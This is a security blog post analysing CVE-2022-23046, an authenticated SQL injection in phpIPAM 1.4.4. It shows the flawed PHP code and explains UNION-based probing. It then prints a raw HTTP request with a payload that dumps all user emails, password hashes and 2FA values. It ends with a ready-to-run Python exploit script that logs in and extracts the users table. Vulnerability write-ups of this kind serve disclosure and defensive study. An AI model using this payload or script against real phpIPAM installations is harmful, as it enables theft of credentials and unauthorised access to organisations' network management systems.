<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="shortcut icon" href="/static/img/favicon.ico" /><title>SQL Injection CVE-2022-23046 - PHPIPAM + Exploit - 0xrdf áŒ·, 0xbaadf00d blog ðŸŽ©</title><meta name="author" content="0xrdf áŒ·" /><meta name="description" content="SQL Injection CVE-2022-23046 - PHPIPAM + Exploit" /><meta name="keywords" content="SQL Injection CVE-2022-23046 - PHPIPAM + Exploit, 0xrdf áŒ·, 0xbaadf00d blog ðŸŽ©, hacking, web" /><link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml"><meta content="" property="fb:app_id"><meta content="0xrdf áŒ·, 0xbaadf00d blog ðŸŽ©" property="og:site_name"><meta content="SQL Injection CVE-2022-23046 - PHPIPAM + Exploit" property="og:title"><meta content="article" property="og:type"><meta content="0xrdf's blog" property="og:description"><meta content="http://localhost:4000/hacking/web/2022/01/20/cve_2022_23046_phpipam.html" property="og:url"><meta content="2022-01-20T17:12:34-03:00" property="article:published_time"><meta content="http://localhost:4000/about/" property="article:author"><meta content="http://localhost:4000/static/img/avatar.png" property="og:image"><meta content="hacking" property="article:section"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@0xrdf0"><meta name="twitter:creator" content="@0xrdf0"><meta name="twitter:title" content="SQL Injection CVE-2022-23046 - PHPIPAM + Exploit"><meta name="twitter:url" content="http://localhost:4000/hacking/web/2022/01/20/cve_2022_23046_phpipam.html"><meta name="twitter:description" content="0xrdf's blog"><link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous"><link rel="stylesheet" href="/static/css/syntax.css"><link href="/static/css/bootstrap.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"><link rel="stylesheet" href="/static/css/super-search.css"><link rel="stylesheet" href="/static/css/thickbox.css"><link rel="stylesheet" href="/static/css/projects.css"><link rel="stylesheet" href="/static/css/main.css"> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-XXXXXXXX-Y', 'auto'); ga('send', 'pageview'); </script><body><div class="container"><div class="col-sm-3"><div class="fixed-condition"> <a href="/"><img class="profile-avatar" src="/static/img/avatar.png" height="75px" width="75px" /></a><h1 class="author-name">0xrdf áŒ·</h1><div class="profile-about"> I am a pentester and mobile security researcher. Also, play CTF's</div><div class="social"><ul><li><a href="https://twitter.com/0xrdf0" target="_blank"><i class="fa fa-twitter"></i></a><li><a href="https://www.linkedin.com/in/0xrdf-augusto-543863a/" target="_blank"><i class="fa fa-linkedin"></i></a><li><a href="https://github.com/0xrdf" target="_blank"><i class="fa fa-github"></i></a></ul></div><div class="search" id="js-search"> <input type="text" placeholder="(sitemap)~$ type to search" class="search__input form-control" id="js-search__input"><ul class="search__results" id="js-search__results"></ul></div><hr /><ul class="sidebar-nav"> <strong>Navigation</strong><li><a href="/">Home</a><li><a class="about" href="/about/">About Me</a><li><a class="about" href="/projects/">My Projects</a><li><a class="about" href="/feed.xml">XML Feed</a></ul></div></div><div class="col-sm-8 col-offset-1 main-layout"><header class="post-header"><h1 class="post-title">SQL Injection CVE-2022-23046 - PHPIPAM + Exploit</h1></header><span class="time">20 Jan 2022</span> <span class="categories"> &raquo; <a href="/category/hacking">hacking</a>, <a href="/category/web">web</a> </span><div class="content"><div class="post"><h1 id="cve-2022-23046---phpipam">CVE-2022-23046 - PHPIPAM</h1><p>TL;DR<p>This write up is about a SQL injection which I found 4 days after another researcher reported it :/, however, because of the fact that I havenâ€™t found any write ups or publicly available exploits, I decided to write about it. Exploit at the end!<p>PHPIPAM is a software widely used internally by several companies. And by being so, it is relatively common for you to find a running instance to manage IT assets, networks, etc. <strong>1.4.4</strong> is the vulnerable version and a fix has already been made public with the arrival of version <strong>1.4.5</strong>. The request responsible for triggering the SQLi is presented below, but if you want to look at the rest, feel free.<div class="language-tsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">routing</span><span class="o">/</span><span class="nx">edit</span><span class="o">-</span><span class="nx">bgp</span><span class="o">-</span><span class="nx">mapping</span><span class="o">-</span><span class="nx">search</span><span class="p">.</span><span class="nx">php</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">localhost</span><span class="p">:</span><span class="mi">8082</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">155</span>
<span class="nx">sec</span><span class="o">-</span><span class="nx">ch</span><span class="o">-</span><span class="nx">ua</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Chromium</span><span class="dl">"</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="dl">"</span><span class="s2">97</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2"> Not;A Brand</span><span class="dl">"</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="dl">"</span><span class="s2">99</span><span class="dl">"</span>
<span class="nx">Accept</span><span class="p">:</span> <span class="o">*</span><span class="cm">/*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost:8082
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8082/index.php?page=administration&amp;section=routing&amp;subnetId=bgp&amp;sPage=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: phpipam=d963c4505df7e33f17e86f70724ec7bb
Connection: close

subnet=test"union+select(select+concat(@:=0x3a,(select+count(*)from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user()+--+-&amp;bgp_id=1
</span></code></pre></div></div><h2 id="code-investigation">Code Investigation</h2><p>By analyzing the following code, we can see that validation is only enforced against the <strong>bgp_id</strong> parameter<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="cm">/* functions */</span>
<span class="k">require_once</span><span class="p">(</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/../../../functions/functions.php'</span> <span class="p">);</span>

<span class="c1"># initialize user object</span>
<span class="nv">$Database</span> 	<span class="o">=</span> <span class="k">new</span> <span class="nc">Database_PDO</span><span class="p">;</span>
<span class="nv">$User</span> 		<span class="o">=</span> <span class="k">new</span> <span class="nc">User</span> <span class="p">(</span><span class="nv">$Database</span><span class="p">);</span>
<span class="nv">$Admin</span>	 	<span class="o">=</span> <span class="k">new</span> <span class="nc">Admin</span> <span class="p">(</span><span class="nv">$Database</span><span class="p">);</span>
<span class="nv">$Tools</span>	 	<span class="o">=</span> <span class="k">new</span> <span class="nc">Tools</span> <span class="p">(</span><span class="nv">$Database</span><span class="p">);</span>
<span class="nv">$Result</span> 	<span class="o">=</span> <span class="k">new</span> <span class="nc">Result</span> <span class="p">();</span>

<span class="c1"># verify that user is logged in</span>
<span class="nv">$User</span><span class="o">-&gt;</span><span class="nf">check_user_session</span><span class="p">();</span>

<span class="c1"># permissions</span>
<span class="nv">$User</span><span class="o">-&gt;</span><span class="nf">check_module_permissions</span> <span class="p">(</span><span class="s2">"routing"</span><span class="p">,</span> <span class="nc">User</span><span class="o">::</span><span class="no">ACCESS_RW</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

<span class="c1"># validates</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'bgp_id'</span><span class="p">]))</span>  			<span class="p">{</span> <span class="nv">$Result</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"danger"</span><span class="p">,</span>  <span class="nf">_</span><span class="p">(</span><span class="s2">"Invalid ID"</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span> <span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'subnet'</span><span class="p">])</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>				<span class="p">{</span> <span class="nv">$Result</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"danger"</span><span class="p">,</span>  <span class="nf">_</span><span class="p">(</span><span class="s2">"Please enter at least 2 characters."</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span> <span class="p">}</span>

<span class="c1"># query</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s1">'select INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like "'</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'subnet'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'%" and `subnet` &gt; 1 and `isFolder` = 0'</span><span class="p">;</span>
<span class="c1"># execute</span>
<span class="k">try</span> <span class="p">{</span> <span class="nv">$subnets</span> <span class="o">=</span> <span class="nv">$Database</span><span class="o">-&gt;</span><span class="nf">getObjectsQuery</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span> <span class="p">}</span>
<span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">print</span> <span class="nv">$Result</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"danger"</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">(),</span> <span class="kc">true</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># printout</span>
<span class="k">if</span><span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$subnets</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">// remove existing</span>
	<span class="nv">$bgp_mapped_subnets</span> <span class="o">=</span> <span class="nv">$Tools</span><span class="o">-&gt;</span><span class="nf">fetch_routing_subnets</span> <span class="p">(</span><span class="s2">"bgp"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'bgp_id'</span><span class="p">],</span> <span class="kc">false</span><span class="p">);</span>
	<span class="nv">$map_arr</span> <span class="o">=</span> <span class="p">[];</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$bgp_mapped_subnets</span><span class="o">!==</span><span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$bgp_mapped_subnets</span> <span class="k">as</span> <span class="nv">$m</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$map_arr</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="n">subnet_id</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="c1">// print remaining</span>
	<span class="nv">$cnt</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
	<span class="k">print</span> <span class="s2">"&lt;table class='table table-condensed table-auto'&gt;"</span><span class="p">;</span>
	<span class="k">foreach</span> <span class="p">(</span><span class="nv">$subnets</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$s</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">,</span> <span class="nv">$map_arr</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">print</span> <span class="s2">"&lt;tr&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;td&gt;&lt;btn class='btn btn-xs btn-success add_bgp_mapping' data-subnetId='</span><span class="nv">$s-&gt;id</span><span class="s2">' data-bgp_id='</span><span class="nv">$_POST[bgp_id]</span><span class="s2">' data-curr_id='</span><span class="nv">$cnt</span><span class="s2">'&gt;&lt;i class='fa fa-plus'&gt;&lt;/i&gt;&lt;/btn&gt;&lt;/td&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;td&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;select name='select-</span><span class="nv">$cnt</span><span class="s2">' class='select-</span><span class="nv">$cnt</span><span class="s2"> form-control input-w-auto input-sm'&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"	&lt;option value='advertised'&gt;"</span><span class="mf">.</span><span class="nf">_</span><span class="p">(</span><span class="s2">"Advertised"</span><span class="p">)</span><span class="mf">.</span><span class="s2">"&lt;/option&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"	&lt;option value='received'&gt;"</span><span class="mf">.</span><span class="nf">_</span><span class="p">(</span><span class="s2">"Received"</span><span class="p">)</span><span class="mf">.</span><span class="s2">"&lt;/option&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;/select&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;td&gt; </span><span class="nv">$s-&gt;subnet</span><span class="s2">/</span><span class="nv">$s-&gt;mask</span><span class="s2"> (</span><span class="nv">$s-&gt;description</span><span class="s2">)&lt;/td&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;td class='result-</span><span class="nv">$cnt</span><span class="s2">'&gt;&lt;/td&gt;"</span><span class="p">;</span>
			<span class="k">print</span> <span class="s2">"&lt;/tr&gt;"</span><span class="p">;</span>
			<span class="nv">$cnt</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">print</span> <span class="s2">"&lt;/table&gt;"</span><span class="p">;</span>
	<span class="c1">// none</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$cnt</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="nv">$Result</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"info"</span><span class="p">,</span> <span class="s2">"No subnets found"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="k">print</span> <span class="nv">$Result</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"info"</span><span class="p">,</span> <span class="s2">"No subnets found"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>Because of the <strong>is_numeric</strong> function, maybe by using versions prior to PHP 5.x, a bypass would occur using 0x[numbers] because, in older PHP versions this was possible, (if you find any way of performing this currently, then youâ€™ve found another vuln). Then we could jump to the next parameter of the request, in this case the <strong>$_POST[â€˜subnetâ€™]</strong> parameter. In it there is a validation, albeit a simple one, the double quotes (â€œ), is still part of the validation, and if you observe carefully, the next step regards precisely concatenating these parameters in a SQL query. In other words, this simple â€œ, can cause problems :D or not. It all depends on your perspective. So by looking at the following query, can you already understand how the execution would flow?<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s1">'select INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like "'</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'subnet'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'%" and `subnet` &gt; 1 and `isFolder` = 0'</span><span class="p">;</span>
</code></pre></div></div><p>It could be something like this:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">INET_NTOA</span><span class="p">(</span><span class="n">subnet</span><span class="p">)</span> <span class="k">as</span> <span class="n">subnet</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">mask</span><span class="p">,</span><span class="n">description</span> <span class="k">from</span> <span class="n">subnets</span> <span class="k">where</span> <span class="n">INET_NTOA</span><span class="p">(</span><span class="n">subnet</span><span class="p">)</span> <span class="k">like</span> <span class="nv">"[YOUR DOUBLE QUOTES HERE]"</span> <span class="k">and</span> <span class="n">subnet</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">and</span> <span class="n">isFolder</span> <span class="o">=</span> <span class="mi">0</span>
</code></pre></div></div><p>The Syntax error will be triggered. As illustrated in the following, at the <strong>subnet</strong> vulnerable parameter.<p><img src="/static/images/Untitled.png" alt="Untitled" /><p>From there we can see that this is a classic based error, so letâ€™s go union :D. First letâ€™s determine how many columns are being returned from the original query (using the <strong>Order by</strong> clause):<p><img src="/static/images/Untitled%201.png" alt="Untitled" /><p>The column in an <strong>ORDER BY</strong> clause can be specified by its index (e.g: 1,2,3,4,5,n), this means thereâ€™s no need of knowing the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:<p><img src="/static/images/Untitled%202.png" alt="Untitled" /><p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the applicationâ€™s response, you can infer how many columns are being returned from the query. The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of <code class="language-plaintext highlighter-rouge">UNION SELECT</code> payloads that place a string value into each column in turn:<p><img src="/static/images/Untitled%203.png" alt="Untitled" /><p>If an error does not occur, and the applicationâ€™s response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data<p>Seek in the following request/response the values of the commands, @@version, database() and user():<p><img src="/static/images/Untitled%204.png" alt="Untitled" /><p>Now letâ€™s dump users and passwords.<p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in position to retrieve interesting data.<p><img src="/static/images/Untitled%205.png" alt="Untitled" /><p>The exploit with <strong>DIOS</strong> query, one shot dump all!<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="c1">################
</span><span class="s">"""
Author of exploit: 0xrdf '0xrdf' áŒ·
CVE: CVE-2022-23046
Type: SQL Injection

Usage:

$ python3 -m pip install requests
$ python3 exploit.py -u http://localhost:8082 -U &lt;admin&gt; -P &lt;password&gt;
"""</span>
<span class="c1">###############
</span>
<span class="n">__author__</span> <span class="o">=</span> <span class="s">"0xrdf"</span>

<span class="n">menu</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"[+] Exploit for PHPIPAM Version: 1.4.4 Authenticated SQL Injection</span><span class="se">\n</span><span class="s"> CVE-2022-23046"</span><span class="p">)</span>
<span class="n">menu</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-u"</span><span class="p">,</span> <span class="s">"--url"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"[+] URL of target, example: https://phpipam.target.com"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
<span class="n">menu</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-U"</span><span class="p">,</span> <span class="s">"--user"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"[+] Username"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
<span class="n">menu</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-P"</span><span class="p">,</span> <span class="s">"--password"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"[+] Password"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">menu</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="n">menu</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span>
<span class="n">user</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">user</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span>

<span class="k">def</span> <span class="nf">get_token</span><span class="p">():</span>
    <span class="n">u</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/app/login/login_check.php"</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"</span><span class="p">,</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded; charset=UTF-8"</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"ipamusername"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span> <span class="s">"ipampassword"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Set-Cookie'</span><span class="p">]</span>
        <span class="n">headers_string</span> <span class="o">=</span> <span class="n">headers</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">headers_string</span><span class="p">:</span>
            <span class="k">if</span> <span class="s">"phpipam"</span> <span class="ow">in</span> <span class="n">s</span> <span class="ow">and</span> <span class="s">","</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span> <span class="c1"># double same cookie Check LoL
</span>                <span class="n">cookie</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">','</span><span class="p">).</span><span class="n">lstrip</span><span class="p">()</span>
                <span class="k">return</span> <span class="n">cookie</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">():</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">()</span>
    <span class="n">xpl</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/app/admin/routing/edit-bgp-mapping-search.php"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"subnet"</span><span class="p">:</span><span class="s">'pwn"union select(select concat(@:=0x3a,(select+count(*) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -'</span><span class="p">,</span> <span class="c1"># dios query dump all :)
</span>        <span class="s">"bgp_id"</span><span class="p">:</span><span class="mi">1</span>
    <span class="p">}</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"</span><span class="p">,</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded; charset=UTF-8"</span><span class="p">,</span>
        <span class="s">"Cookie"</span><span class="p">:</span> <span class="n">cookie</span>
    <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">xpl</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"admin"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s">"rounds"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"[+] Vulnerable..</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"&gt; Users and hash passwords: </span><span class="se">\n\n</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">&gt; DONE &lt;"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">exploit_sqli</span><span class="p">()</span>
</code></pre></div></div><p>Keep hacking #thanks .</div><div class="share-page"> <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span> <a href="https://twitter.com/share" class="twitter-share-button" data-via="0xrdf0">Tweet</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script><div class="g-plus" data-action="share" data-annotation="bubble"></div><script src="https://apis.google.com/js/platform.js" async defer></script><div class="fb-share-button" data-href="http://localhost:4000/hacking/web/2022/01/20/cve_2022_23046_phpipam.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div></div><div id="fb-root"></div><script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId="; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script></div><div class="panel-body"><h4>Related Posts</h4><ul><li class="relatedPost"> <a href="http://localhost:4000/hacking/web/2023/02/25/BURPCHALLENGE.html">Making money like magic</a> (Categories: <a href="/category/hacking">hacking</a>, <a href="/category/web">web</a>)<li class="relatedPost"> <a href="http://localhost:4000/hacking/2022/06/09/nim-reversing.html">Reversing Nim Binary With Radare</a> (Categories: <a href="/category/hacking">hacking</a>)<li class="relatedPost"> <a href="http://localhost:4000/hacking/2022/03/19/antitamper-ios.html">iOS Anti-Tampers Bypass</a> (Categories: <a href="/category/hacking">hacking</a>)<li class="relatedPost"> <a href="http://localhost:4000/hacking/2020/02/02/bypass-nac.html">Bypass NAC ( Network Access Control )</a> (Categories: <a href="/category/hacking">hacking</a>)<li class="relatedPost"> <a href="http://localhost:4000/hacking/2020/02/02/RCE-FROM-PATHTRAVERSAL.html">RCE using Path Traversal</a> (Categories: <a href="/category/hacking">hacking</a>)</ul></div><div class="PageNavigation"> <a class="prev" href="/hacking/2020/02/02/bypass-nac.html">&laquo; Bypass NAC ( Network Access Control )</a> <a class="next" href="/hacking/2022/03/19/antitamper-ios.html">iOS Anti-Tampers Bypass &raquo;</a></div><div class="disqus-comments"><div id="disqus_thread"></div><script type="text/javascript"> /* <![CDATA[ */ var disqus_shortname = ""; var disqus_identifier = "http://localhost:4000_SQL Injection CVE-2022-23046 - PHPIPAM + Exploit"; var disqus_title = "SQL Injection CVE-2022-23046 - PHPIPAM + Exploit"; /* * * DON'T EDIT BELOW THIS LINE * * */ 